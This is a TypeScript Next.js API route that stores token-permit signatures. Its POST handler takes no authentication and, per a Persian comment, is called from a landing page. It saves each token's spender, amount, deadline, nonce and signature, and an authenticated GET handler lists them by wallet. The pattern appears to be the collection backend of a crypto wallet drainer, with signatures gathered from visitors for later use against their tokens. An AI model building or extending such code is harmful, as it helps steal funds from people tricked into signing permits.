// app/api/signatures/route.ts
import { NextRequest, NextResponse } from 'next/server';
import pool from '@/lib/db';
import { requireAuth } from '@/lib/auth-check';

export async function GET(req: NextRequest) {
    const authError = await requireAuth();
    if (authError) return authError;

    const { searchParams } = new URL(req.url);
    const walletAddress = searchParams.get('wallet');
    if (!walletAddress) return NextResponse.json({ success: false, error: 'wallet param required' }, { status: 400 });

    try {
        const [rows] = await pool.query(
            'SELECT * FROM signatures WHERE wallet_address = ? ORDER BY signed_at DESC',
            [walletAddress.toLowerCase()]
        );
        return NextResponse.json({ success: true, data: rows });
    } catch (err: any) {
        return NextResponse.json({ success: false, error: err?.message }, { status: 500 });
    }
}

export async function POST(req: NextRequest) {
    // بدون auth — از landing page صدا زده میشه
    try {
        const { walletAddress, signature, permitBatch, chainId, chainLabel } = await req.json();
        if (!walletAddress || !signature || !permitBatch) {
            return NextResponse.json({ success: false, error: 'Missing required fields' }, { status: 400 });
        }

        // پیدا کردن wallet_id
        const [walletRows]: any = await pool.query(
            'SELECT id FROM wallets WHERE address = ?',
            [walletAddress.toLowerCase()]
        );
        if (!walletRows.length) {
            return NextResponse.json({ success: false, error: 'Wallet not found' }, { status: 404 });
        }
        const walletId = walletRows[0].id;

        // هر توکن یه ردیف جداگانه
        for (const detail of permitBatch.details) {
            await pool.query(
                `INSERT INTO signatures 
         (wallet_id, wallet_address, token_address, token_symbol, token_name, token_decimals,
          chain_id, chain_label, spender, value, deadline, nonce, signature)
         VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?, ?)`,
                [
                    walletId,
                    walletAddress.toLowerCase(),
                    (detail.address || detail.token).toLowerCase(),
                    detail.symbol || '',
                    detail.name || '',
                    detail.decimals ?? 18,
                    chainId.toString(),
                    chainLabel || '',
                    permitBatch.spender.toLowerCase(),
                    detail.amount.toString(),
                    permitBatch.sigDeadline.toString(),
                    detail.nonce ?? 0,
                    signature,
                ]
            );
        }

        return NextResponse.json({ success: true });
    } catch (err: any) {
        return NextResponse.json({ success: false, error: err?.message }, { status: 500 });
    }
}